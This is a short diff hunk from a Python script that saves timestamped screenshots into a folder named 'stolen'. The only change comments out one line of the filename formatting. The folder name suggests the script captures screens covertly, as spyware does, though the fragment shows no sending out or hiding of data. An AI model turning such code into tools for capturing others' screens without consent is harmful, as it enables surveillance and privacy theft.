@@ -58,7 +58,7 @@ if __name__ == "__main__":
         except:
             continue
         name = time.asctime().split(" ")
-        name.pop(2)
+        # name.pop(2)
         name += name[3].split(':')
         name.pop(3)
         myScreenshot.save(rf'stolen\picture_{"_".join(name)}.png')
